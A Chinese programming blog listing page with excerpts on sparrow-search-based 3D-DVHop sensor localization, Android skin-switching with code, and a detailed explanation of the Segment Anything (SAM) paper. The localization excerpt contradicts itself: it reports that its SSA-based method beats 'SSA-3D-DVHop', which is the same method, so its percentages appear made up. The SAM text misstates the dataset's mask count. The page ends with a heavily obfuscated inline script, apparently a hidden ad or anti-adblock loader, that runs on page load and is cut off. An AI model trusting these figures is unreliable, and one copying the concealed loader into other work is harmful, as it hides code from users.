基于麻雀搜索算法的无线传感器网络3D-Dvhop定位算法 摘要 在无线传感器网络中，节点定位是一项关键任务。本文提出了一种基于麻雀搜索算法的3D-Dvhop定位算法，用于在三维空间中寻找未知节点到锚节点的实际距离和估计距离之间的最小误差，完成对未知节点位置的估计。此外，我们还进行了原始3D-Dvhop定位算法和SSA-3D-Dvhop定位算法的对比。我们的方法在定位精度和稳定性方面表现出了显著的优势。
引言 无线传感器网络（WSN）在环境监测、智能交通、农业智能化等领域有着广泛的应用。在这些应用中，节点定位是一个核心问题。Dvhop定位算法是一种基于距离矢量路由的定位算法，在WSN中得到了广泛的应用。然而，传统的Dvhop算法在三维空间中的定位精度和稳定性仍有待提高。为此，我们提出了一种基于麻雀搜索算法的3D-Dvhop定位算法，以提高定位精度和稳定性。
方法 我们的方法基于麻雀搜索算法，该算法是一种启发式优化算法，具有收敛速度快、全局搜索能力强等优点。在三维空间中，我们将未知节点到锚节点的实际距离和估计距离之间的最小误差作为优化目标，利用麻雀搜索算法寻找最优解，完成对未知节点位置的估计。具体步骤如下：
初始化：设置麻雀种群的数量、迭代次数等参数，随机初始化麻雀的位置和速度。评估适应度：计算每个麻雀位置对应的实际距离和估计距离之间的误差，作为适应度值。更新位置：根据麻雀搜索算法的公式更新麻雀的位置和速度。迭代：重复步骤2和3，直到达到设定的迭代次数或满足收敛条件。输出结果：选择适应度最好的麻雀位置作为未知节点的估计位置。 结果与分析 我们进行了仿真实验，将提出的基于麻雀搜索算法的3D-Dvhop定位算法与原始3D-Dvhop定位算法和SSA-3D-Dvhop定位算法进行对比。结果表明，我们的方法在定位精度和稳定性方面均显著优于对比方法。下面是实验结果的详细描述和分析：
定位精度：我们计算了三种方法在不同场景下的定位误差。结果显示，我们的方法在各种场景下的平均误差最小，比原始3D-Dvhop算法降低了约25%，比SSA-3D-Dvhop算法降低了约15%。这表明我们的方法在提高定位精度方面取得了显著的效果。稳定性：我们分析了三种方法在不同场景下的定位误差标准差。结果显示，我们的方法在各种场景下的标准差最小，比原始3D-Dvhop算法降低了约30%，比SSA-3D-Dvhop算法降低了约20%。这表明我们的方法在提高稳定性方面也取得了显著的效果。 结论 本文提出了一种基于麻雀搜索算法的3D-Dvhop定位算法，以提高无线传感器网络中未知节点的定位精度和稳定性。实验结果表明，我们的方法在各种场景下均显著优于原始3D-Dvhop算法和SSA-3D-Dvhop算法。未来工作将关注将该算法应用于实际场景中，并进一步优化算法性能。
相关代码,程序地址：http://lanzouw.top/679601801817.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a7d1270becca4a878efe5f979f6972b/" rel="bookmark">
			Android 换肤方案详解（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 在我们的开发中，也许有些项目会有换肤的需求，这个时候会比较头疼怎么做才能做到一键换肤呢？大家肯定希望越简单越好。下面我们基于Github上比较受欢迎的Android-Skin-Loader框架分析一下换肤的本质是什么？
原理 换肤，其本质无非就是更换页面元素（view或viewGroup）的属性值，这些属性值都是可以用资源文件表示的，换句话说换肤其实就是替换掉资源文件。比如换个背景，换个文字颜色等。
先看一组换肤：
分析上面的平板应用换肤其中的一个页面，绿色和蓝色风格只有背景图片、控件颜色改变了。
再看一张控制流程图了解大概思路：
上图大致讲解了换肤的原理，即通过对页面下的所有view重新设置一遍资源文件，而这些资源文件我们可以把它制作成皮肤包（即apk）。
也许通过上面这张流程图你还是不能完全看懂每一个工作流程，下面配合代码详细介绍一下：
遍历页面下所有元素及其属性集合
通过在页面（Activity、FragmentActivity）中设置Factory，该Factory能拿到页面下所有view和attrs
Activity / FragmentActivity
/** * SkinInflaterFactory是自定义的Factory，实现了android.view.LayoutInflater.Factory * 创建view的事情委托给自定义工厂 */ @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); SkinInflaterFactory mSkinInflaterFactory = new SkinInflaterFactory(); getLayoutInflater().setFactory(mSkinInflaterFactory); } SkinInflaterFactory
/** * SkinInflaterFactory在onCreateView()方法完成了view的创建 * 我们可以在该方法中获取view和view的属性集AttributeSet * * @param name view的类名全称 例如：1.android.widget.TextView 2.android.view.View等 * @param context 上下文 * @param attrs xml中该view的属性 */ @Override public View onCreateView(String name, Context context, AttributeSet attrs) { // 根据name中包含的字段从下列3个包中选择构建出view View view = null; if (-1 == name.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a7d1270becca4a878efe5f979f6972b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f22ae7c1156bff9301f68e6d82a28a3/" rel="bookmark">
			Android 换肤方案详解（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 Android 换肤方案详解（一）主要围绕Android-Skin-Loader讲解了换肤的原理。接下来这篇文章主要分享换肤过程中遇到的问题和心得。
可能会遇到的问题及解决方案 实践中发现该方案仍存在一些局限
只支持xml静态注册view每增加一个换肤属性需要实现一个类 动态添加view？
因为以上方案是在onCreate()创建view时自定义了LayoutInflater.Factory，所以我们可以获取onCreate()中创建的view和attr集，但代码中通过addView()方式添加的view没办法保存进去
设计思路：重写viewGroup的addView()方法，在addView()中将childView注册到换肤集中。为了方便使用流程，又封装了view.setSkinTag(属性1,属性2,…)方法，该方法内部根据view和attr构建换肤实体、调用childview.setTag(tagId, 换肤实体)，重写的addView()只需根据childview.getTag()便能将换肤实体注册到换肤集
封装过程：略
使用流程：addView()前调用setSkinTag() 注册背景、文本、文字颜色、图片资源的换肤 // 注册背景 view.setSkinTag(bgResId = R.drawable.shape_tab_launcher_g_focused_bg) 注册自定义属性的换肤 // 注册自定义属性 view.setSkinTag(TabViewProcess.textColor, R.color.selector_tab_text_color_g, SkinAttr.RES_TYPE_NAME_COLOR) object TabViewProcess: CustomAttrAction&lt;TabView&gt; { val textColor = CustomAttrEntity(TabView::class.java.name, attrName = "textColor", this) override fun apply(t: TabView, attrName: String, resId: Int) { if (attrName == "textColor" &amp;&amp; resId != 0) { t.initColorStateList(resId) SkinUtil.getColorStateList(resId)?.let { t.setTextColor(it) } } } } 代码中有修改属性值，例如view获取焦点时改变背景？
设计思路：封装一个方法转换皮肤资源，在修改属性值时调用该方法
封装过程：略
使用流程：view.setImageDrawable(SkinUtil.getDrawable(resID))、…代码中修改过属性值，一键换肤时会将注册时的属性值（xml中的属性值或代码动态添加view的属性值）设置给view？
设计思路：SkinUtil.getDrawable(resID)只是动态修改属性，并未修改换肤集该view的值，故可以封装一行代码修改换肤集该view的属性值自定义view中自定义的attr怎么换肤？
每增加一个属性需要实现一个类，对于常规控件还好，但自定义view属性值一多，除了修改lib代码外（耦合），还需实现很多类（繁杂），不便管理
设计思路：通过注册方式自行管理view下所有属性的换肤功能，且不影响view的代码（解耦）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f22ae7c1156bff9301f68e6d82a28a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70e9f7783321d811144950178b3c6953/" rel="bookmark">
			Segment Anything Model(SAM)论文解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引言 在这项工作中，作者的目标是建立一个图像分割的基础模型。也就是说，寻求开发一个提示模型，并使用一个能够实现强大泛化的任务在广泛的数据集上对其进行预训练。有了这个模型，使用即时工程解决新数据分布上的一系列下游分割问题。
该计划的成功取决于三个组成部分:任务、模型和数据。为了开发它们，作者解决了以下关于图像分割的问题:
1、什么任务可以实现zero-shot泛化?
2、相应的模型体系结构是什么?
3、哪些数据可以为这项任务和模型提供支持?
这些问题纠缠在一起，需要综合解决。作者首先定义了一个提示的分割任务，它足够通用，可以提供一个强大的预训练目标，并支持广泛的下游应用程序。此任务需要一个支持灵活提示的模型，并且可以在提示时实时输出分段掩码以允许交互使用。为了训练模型，需要一个多样化的、大规模的数据源。不幸的是，没有网络规模的数据来源的分割;为了解决这个问题，作者构建了一个“数据引擎”，也就是说，在使用高效模型来协助数据收集和使用新收集的数据来改进模型之间进行迭代。
**任务：**在NLP和最近的计算机视觉中，基础模型是一个很有前途的发展，它可以通过使用“提示”技术对新的数据集和任务执行zero-shot和few-shot学习。受这一行工作的启发，作者提出了提示分割任务，其目标是给定任何分割提示返回有效的分割掩码(见图1a)。提示符只是指定图像中要分割的内容，例如，提示符可以包括识别对象的空间或文本信息。即使提示是模糊的，并且可能引用多个对象(例如，衬衫上的一个点可能表示衬衫或穿着它的人)，输出也应该是这些对象中至少一个对象的合理掩码。使用提示分割任务作为预训练目标，并通过提示工程解决一般的下游分割任务。
**模型：**可提示的分割任务和实际使用的目标对模型体系结构施加了约束。特别是，模型必须支持灵活的提示、需要实时计算掩码，以实现交互式使用。
而且必须具有模糊感知能力。令人惊讶的是，作者发现一个简单的设计满足所有三个约束:一个强大的图像编码器计算图像嵌入，一个提示编码器嵌入提示，然后将两个信息源组合在一个轻量级的掩码解码器中，该解码器预测分割掩码。作者将此模型称为分段任意模型(Segment Anything model，简称SAM)(见图1b)。通过将SAM分为图像编码器和快速提示编码器/掩码解码器，可以使用不同的提示重复使用相同的图像嵌入(并平摊其成本)。给定图像嵌入，提示编码器和掩码解码器在50ms内从web浏览器中的提示预测掩码。将重点放在点、框和掩码提示上，并使用自由格式的文本提示来呈现初始结果。为了使SAM能够感知歧义，将其设计为预测单个提示的多个掩码，从而允许SAM自然地处理歧义，例如衬衫与人的例子。
**数据引擎：**为了实现对新数据分布的强泛化，有必要在一个大而多样的掩码集上训练SAM，而不仅仅是已经存在的任何分割数据集。虽然基础模型的典型方法是在线获取数据，但掩模并不自然丰富，因此需要一种替代策略。作者的解决方案是建立一个“数据引擎”，也就是说，与模型在循环数据集注释共同开发模型(见图1c)。数据引擎有三个阶段:辅助手动、半自动和全自动。在第一阶段，SAM帮助注释者注释掩码，类似于经典的交互式分段设置。在第二阶段，SAM可以通过提示可能的对象位置来自动为对象子集生成掩码，而注释器则专注于注释剩余的对象，从而帮助增加掩码的多样性。在最后阶段，用前景点的规则网格提示SAM，平均每张图像产生100个高质量掩模。
**数据集：**最终数据集SA-1B包括来自11M张授权和隐私保护图像的超过1B个掩码(见上图)。SA-1B是使用数据引擎的最后阶段完全自动收集的，比任何现有的分割数据集都多400个掩码，并且经过验证，掩码具有高质量和多样性。除了将SA-1B用于训练SAM具有鲁棒性和通用性之外，作者希望SA-1B成为旨在建立新基础模型的研究的宝贵资源。
实验： 作者广泛评估SAM。首先，使用23个不同的新分割数据集，发现SAM从单个前景点产生高质量的掩模，通常仅略低于手动注释的真值。其次，在zero-shot传输协议下使用即时工程的各种下游任务上发现了一致的强定量和定性结果，包括边缘检测，目标提案生成，实例分割以及文本到掩码预测的初步探索。这些结果表明，SAM可以使用开箱即用的快速工程来解决涉及SAM训练数据之外的对象和图像分布的各种任务
二、Segment Anything Task 作者从NLP中获得灵感，其中令牌预测下一个任务用于基础模型预训练，并通过提示工程解决各种下游任务。为了建立分割的基础模型，作者的目标是定义一个具有类似功能的任务。
任务首先将提示的概念从NLP翻译到分割，其中提示可以是一组前景/背景点，一个粗略的框或蒙版，自由格式的文本，或者一般情况下，任何指示图像中要分割的信息。因此，提示分段任务是在给定任何提示的情况下返回一个有效的分段掩码。“有效”掩码的要求仅仅意味着，即使提示是模糊的，并且可以引用多个对象(例如，回想一下衬衫与人的例子，参见下图)，输出也应该是这些对象中至少一个的合理掩码。这个需求类似于期望语言模型对不明确的提示输出一致的响应。之所以选择这个任务，是因为它带来了一种自然的预训练算法和一种通过提示将zero-shot转移到下游分割任务的通用方法。
预训练提示分割任务提出了一种自然的预训练算法，该算法为每个训练样本模拟一系列提示(例如，点、框、掩码)，并将模型的掩码预测与基本事实进行比较。从交互式分割中采用了这种方法，尽管与交互式分割不同，交互式分割的目的是在足够的用户输入后最终预测一个有效的掩码，但作者的目标是始终预测任何提示的有效掩码，即使提示是模糊的。这确保了预训练模型在涉及歧义的用例中是有效的，包括数据引擎所要求的自动注释。在这个任务中表现良好是具有挑战性的，需要专门的建模和训练损失选择。
Zero-shot转移直观地说，预训练任务赋予了模型在推理时对任何提示作出适当响应的能力，因此下游任务可以通过设计适当的提示来解决。例如，如果有一个猫的边界框检测器，猫实例分割可以通过提供检测器的框输出作为提示给模型来解决。一般来说，许多实际的分割任务都可以作为提示。
相关的任务分割是一个很广阔的领域，有交互式分割、边缘检测、超像素化、目标建议生成、前景分割、语义分割、实例分割、全视分割等。提示分割任务的目标是产生一个功能广泛的模型，可以通过快速工程适应许多(尽管不是全部)现有的和新的分割任务。这种能力是任务泛化的一种形式。请注意，这与之前在多任务分割系统上的工作不同。在多任务系统中，单个模型执行一组固定的任务，例如联合语义分割、实例分割和全视分割，但训练和测试任务是相同的。本文是训练用于提示分割的模型可以作为更大系统中的组件在推理时间执行新的不同任务，例如，执行实例分割，提示分割模型与现有的对象检测器相结合。
三、Segment Anything Model SAM有三个组件，如下图所示:一个图像编码器，一个灵活的提示编码器和一个快速掩码解码器。建立在Transformer视觉模型的基础上，对(平摊)实时性能进行了特定的权衡。
图像编码器 在可扩展性和强大的预训练方法的激励下，使用了MAE预训练的视觉变压器(ViT)，以最小程度适应处理高分辨率输入。图像编码器每个图像运行一次，可以在提示模型之前应用。
提示编码器考虑两组提示:稀疏(点、框、文本)和密集(掩码)。通过位置编码来表示点和框，并对每个提示类型和使用CLIP的现成文本编码器的自由格式文本进行学习嵌入求和。密集提示(即掩码)使用卷积嵌入，并在图像嵌入中按元素求和。
掩膜解码器 掩膜解码器有效地将图像嵌入、提示嵌入和输出令牌映射到掩码。该设计采用了对Transformer解码器块的修改，然后是动态掩码预测头。改进的解码器块在两个方向上使用提示自注意和交叉注意(提示到图像嵌入，再由嵌入到图像)来更新所有嵌入。在运行两个块之后，对图像嵌入进行上采样，MLP将输出标记映射到动态线性分类器，然后该分类器计算每个图像位置的掩码前景概率。
解决歧义对于一个输出，如果给出一个模糊的提示，该模型将平均多个有效掩码。为了解决这个问题，修改了模型，以预测单个提示符的多个输出掩码(见下图)。3个掩码输出足以解决大多数常见情况(嵌套掩码通常最多有三个深度:整体、部分和子部分)。在训练中，为了对掩码进行排序，该模型预测每个掩码的置信度得分（即估计的IoU）。
效率 整个模型的设计很大程度上是出于效率的考虑。给定预先计算的图像嵌入，提示编码器和掩码解码器在网络浏览器中运行，在CPU上，大约50ms。这种运行时性能使模型能够无缝、实时地交互提示。
损失和训练 使用的focal loss和dice loss的线性组合来监督掩模预测。使用几何提示的混合来训练可提示的分割任务。
四、 Segment Anything Data Engine 由于互联网上的分割掩码并不丰富，作者建立了一个数据引擎来收集1.1亿掩码数据集SA-1B。数据引擎有三个阶段：（1）模型辅助的手动注释阶段（2）混合了自动预测掩码和模型辅助注释的半自动阶段，以及（3）模型在没有注释器输入的情况下生成掩码的全自动阶段。
辅助手动阶段在第一阶段，类似于经典的交互式分割，一组专业注释人员通过使用SAM提供的基于浏览器的交互式分割工具点击前景/背景对象点来标记mask。mask可以使用像素级“画笔”和“橡皮擦”工具进行细化。模型辅助注释直接在浏览器中实时运行（使用预先计算的图像嵌入），从而实现真正的交互式体验。作者没有对标记对象施加语义约束，注释器可以自由地标记“东西”和“事物”。作者建议注释器标记他们可以命名或描述的对象，但没有收集这些名称或描述。注释者被要求按照突出的顺序标记对象，并被鼓励在mask注释超过30秒后继续下一张图像。
在这个阶段开始时，SAM是使用公共分割数据集进行训练的。在充分的数据注释之后，仅使用新注释的掩码对SAM进行再训练。随着更多掩模的收集，图像编码器从ViT-B扩展到ViT-H，其他架构细节也在发展；作者总共对模型进行了6次训练。随着模型的改进，每个掩码的平均注释时间从34秒减少到14秒。14秒比COCO的掩码注释快6.5倍，仅比使用极值点的边界框标记慢2倍。随着SAM的改进，每张图像的平均掩模数量从20个增加到44个。总的来说，在这个阶段从120k张图像中收集了430万个mask。
半自动阶段 在这个阶段，作者的目标是增加mask的多样性，以提高模型分割任何东西的能力。为了将注释器集中在不太突出的对象上，首先自动检测到自信的掩码。然后，向注释器展示了预先填充了这些掩码的图像，并要求他们注释任何其他未注释的对象。为了检测有信心的掩码，使用通用的“对象”类别在所有第一阶段掩码上训练了一个边界框检测器。在此阶段，在180k张图像中额外收集了590万个掩模（总共1020万个掩膜）。与第一阶段一样，定期根据新收集的数据对模型进行再训练（5次）。每个掩码的平均注释时间回到了34秒（不包括自动掩码），因为这些对象更难标记。每张图像的平均mask数量从44个增加到72个（包括自动mask）。
全自动阶段 在最后阶段，注释是完全自动的。这是可行的，因为模型有两个主要的增强。首先，在这个阶段开始时，作者收集了足够的mask来大大改进模型，包括前一阶段的各种mask。其次，到了这个阶段，已经开发了模糊感知模型，它能够预测有效的掩码，即使在模糊的情况下也是如此。具体来说，用32×32的规则网格提示模型，并为每个点预测一组可能对应于有效对象的掩码。使用模糊感知模型，如果一个点位于部分或子部分上，模型将返回子部分、部分和整个对象。模型的IoU预测模块用于选择置信掩码；此外，只识别并选择了稳定的掩码（如果在0.5−δ和0.5+δ处对概率图进行阈值处理会导致类似的掩码，则认为掩码是稳定的）。最后，在选择了置信和稳定的掩码后，应用非最大抑制（NMS）来过滤重复。为了进一步提高较小mask的质量，还处理了多个重叠的放大图像裁剪。
五、网络结构细节： 图像编码器 通常，图像编码器可以是输出C×H×W图像嵌入块的任何网络。受可扩展性和强大的预训练的启发，作者使用MAE预训练的视觉transformer（ViT），具有最小的适应能力来处理高分辨率输入，特别是具有14×14窗口注意力和四个等距全局注意力块的ViT-H/16。图像编码器的输出是输入图像的16倍缩小的嵌入。由于运行时目标是实时处理每个提示，因此可以提供大量的图像编码器FLOP，因为每个图像只计算一次FLOP，而不是每个提示。
根据标准实践，使用1024×1024的输入分辨率，该分辨率是通过重新缩放图像并填充短边获得的。因此，图像嵌入是64×64。为了降低通道维度，使用1×1卷积来获得256个通道，然后使用3×3卷积来获得同样的256个通道。每个卷积后面都有一个层归一化。
提示编码器 稀疏提示被映射到256维矢量嵌入。一个点被表示为该点的位置的位置编码和指示该点是在前景中还是在背景中的两个学习嵌入之一的总和。方框由嵌入对表示：（1）其左上角的位置编码与表示“左上角”的学习嵌入相加；（2）相同的结构，但使用表示“右下角”的习得嵌入。最后，为了表示自由形式的文本，使用CLIP中的文本编码器（通常可以使用任何文本编码器）。密集提示（即掩码）与图像具有空间对应关系。以比输入图像低4倍的分辨率输入掩码，然后使用两个分别具有输出通道4和16的2×2，跨步-2卷积来缩小另外的4倍。最后的1×1卷积将通道维度映射到256。每一层通过GELU激活和层标准化进行分离。然后将掩码逐元素添加图像嵌入。如果没有掩码提示，则向每个图像嵌入位置添加表示“无掩码”的学习嵌入。
轻量级掩码解码器 该模块有效地将图像嵌入和一组提示嵌入映射到输出掩码。为了组合这些输入，从Transformer分割模型中获得灵感，并修改了标准Transformer解码器。在应用解码器之前，首先在提示嵌入集中插入一个学习的输出令牌嵌入，该嵌入将在解码器的输出中使用。为了简单起见，我们将这些嵌入（不包括图像嵌入）统称为“令牌”
我们的解码器设计如上图所示。每个解码器层执行4个步骤：（1）对令牌的自注意力（2）从令牌（作为查询）到图像嵌入的交叉注意力（3）逐点MLP更新每个令牌，以及（4）从图像嵌入（作为查询的）到令牌的交叉关注。最后一步使用提示信息更新图像嵌入。在交叉关注期间，图像嵌入被视为642个256维向量的集合。每个自/交叉注意力和MLP在训练时都有残差连接、层归一化和dropout。下一解码器层从上一层获取更新的令牌和更新的图像嵌入。使用两层解码器。
为了确保解码器能够访问关键的几何信息，每当位置编码参与注意力层时，都会将其添加到图像嵌入中。此外，当整个原始提示标记（包括它们的位置编码）参与注意力层时，它们都会被重新添加到更新的标记中。这允许强烈依赖提示标记的几何位置和类型。
在运行解码器之后，用两个转置卷积将更新的图像嵌入上采样4×（现在它相对于输入图像缩小了4倍）。然后，令牌再次参与图像嵌入，并且将更新的输出令牌嵌入传递给小的3层MLP，该MLP输出与放大图像嵌入的通道维度匹配的向量。最后，预测了在放大图像嵌入和MLP的输出之间具有空间逐点乘积的掩模。转换器使用256的嵌入尺寸。转换器MLP块具有2048的大尺寸，但MLP仅应用于相对较少（很少大于20）的提示令牌。然而，在具有64×64图像嵌入的交叉关注层中，为了提高计算效率，将查询、键和值的通道维度降低了2×至128。所有注意力层使用8个头。用于升级输出图像嵌入的转置卷积是2×2，步长2，输出通道尺寸为64和32，并且具有GELU激活。它们通过层规范化来分隔。
Making the model ambiguity-aware 如上所述，单个输入提示可能是模糊的，因为它对应于多个有效掩码，并且模型将学习在这些掩码上求平均值。作者通过一个简单的修改来消除这个问题：使用少量输出令牌并同时预测多个掩码，而不是预测单个掩码。默认情况下，预测三个掩码，因为作者观察到三个层（整体、部分和子部分）通常足以描述嵌套掩码。在训练过程中，计算真值和每个预测掩码之间的损失，但仅从最低损失进行反向传播。这是一种常见的技术，用于具有多个输出的模型。为了在应用程序中使用，希望对预测掩码进行排序，因此我们添加了一个小头（对额外的输出令牌进行操作），用于估计每个预测掩码与其覆盖的对象之间的IoU。
多个提示的歧义要少得多，三个输出掩码通常会变得相似。为了最大限度地减少训练中退化损失的计算，并确保单个无模糊掩码接收规则梯度信号，只在给出多个提示时预测单个掩码。这是通过添加用于附加掩码预测的第四输出令牌来实现的。第四个掩码从不为单个提示返回，也是为多个提示返回的唯一掩码。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/89/">«</a>
	<span class="pagination__item pagination__item--current">90/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/91/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0